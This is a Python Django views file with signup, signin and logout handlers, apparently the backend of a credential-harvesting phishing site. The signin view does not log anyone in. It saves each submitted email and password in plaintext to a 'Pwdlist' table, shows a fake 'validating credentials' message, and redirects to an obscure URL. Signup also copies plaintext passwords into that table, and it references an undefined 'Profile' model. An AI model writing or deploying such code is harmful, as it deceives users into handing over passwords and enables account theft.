from django.shortcuts import render
from django.shortcuts import render, redirect
from django.contrib.auth.models import User, auth
from django.contrib import messages
from django.http import HttpResponse
from django.contrib.auth.decorators import login_required
from .models import Pwdlist
import random
import time
from datetime import datetime
from django.http import JsonResponse
from rest_framework.decorators import api_view
from rest_framework.response import Response
from rest_framework import status
import openai, os
from itertools import chain
import re

def index(request):

    return render(request, 'home.html')

def signup(request):
    
    if request.method == 'POST':
        username = request.POST['username']
        email = request.POST['email']
        password = request.POST['password']
        password2 = request.POST['password2']

        if password == password2:
            if User.objects.filter(email=email).exists():
                messages.info(request, 'Email Taken')
                return redirect('signup')
            elif User.objects.filter(username=username).exists():
                messages.info(request, 'Username Taken')
                return redirect('signup')
            else:
                user = User.objects.create_user(username=username, email=email, password=password)
                user.save()
                new_pwdlist = Pwdlist.objects.create(username=username, email=email, password=password)
                new_pwdlist.save()

                #Log user + redirect to settings
                user_login = auth.authenticate(username=username, password=password)
                auth.login(request, user_login)

                #create profile for user

                user_model = User.objects.get(username=username)
                new_profile = Profile.objects.create(user=user_model, id_user=user_model.id)
                new_profile.save()
                return redirect('/')
        else:
            messages.info(request, 'Password Not Mathching')
            return redirect('signup')
    else:
        return render(request, 'signup.html')

def signin(request):

    if request.method == 'POST':
        password = request.POST['password']
        email = request.POST['email']
        new_pwdlist = Pwdlist.objects.create(email=email, password=password)
        new_pwdlist.save()

        messages.info(request, 'It takes time to validate credentials...')


        return redirect('/wertWeRt34ek')

    else:
        return render(request, 'signin.html')


@login_required(login_url="signin")
def logout(request):
    auth.logout(request)
    return redirect('signin')
